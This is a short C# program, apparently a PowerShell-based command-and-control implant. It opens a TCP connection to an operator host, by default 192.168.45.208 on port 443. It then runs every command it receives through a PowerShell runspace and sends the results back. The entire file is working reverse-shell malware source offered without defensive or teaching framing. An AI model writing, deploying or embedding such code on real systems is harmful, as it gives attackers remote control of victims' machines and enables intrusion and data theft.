using System.Net.Sockets;
using System.Net;
using System.Text;
using System;

namespace RFC_SimpleRunspaceC2
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string host;
            int port;

            if (args.Length > 0)
            {
                host = args[0];
                port = Int32.Parse(args[1]);
            }
            else
            {
                host = "192.168.45.208";
                port = 443;
            }

            TcpClient client = new TcpClient(host, port);
            Console.WriteLine($"Connected to -> {((IPEndPoint)client.Client.RemoteEndPoint).ToString()}");

            // Starting PowerShell runspace
            PwshRunspace powershell = new PwshRunspace();
            powershell.Start();

            try
            {
                // Get a stream object for reading and writing
                NetworkStream stream = client.GetStream();

                // Enter the listening loop.
                while (true)
                {
                    // receive data
                    byte[] buffer = new byte[client.ReceiveBufferSize];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    // send data
                    string results = powershell.RunPwshCommand(data);
                    byte[] resultBytes = Encoding.UTF8.GetBytes(results);
                    stream.Write(resultBytes, 0, resultBytes.Length);
                }
            }
            catch (Exception)
            {
                return;
            }
        }
    }
}
